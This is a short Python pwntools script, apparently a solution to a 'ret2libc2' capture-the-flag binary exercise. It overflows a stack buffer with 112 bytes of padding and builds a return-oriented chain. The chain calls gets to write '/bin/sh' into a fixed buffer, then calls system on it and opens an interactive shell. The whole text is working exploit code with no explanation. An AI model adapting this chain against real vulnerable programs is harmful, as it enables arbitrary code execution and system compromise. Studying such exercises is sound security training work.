from pwn import *

sh = process('./ret2libc2')

gets = 0x08048460

system = 0x08048490

buf = 0x804a080

pop_ebx = 0x0804843d

payload = flat(['a'*112,gets,pop_ebx,buf,system,'1111',buf])

sh.sendline(payload)

sh.sendline('/bin/sh')

sh.interactive()
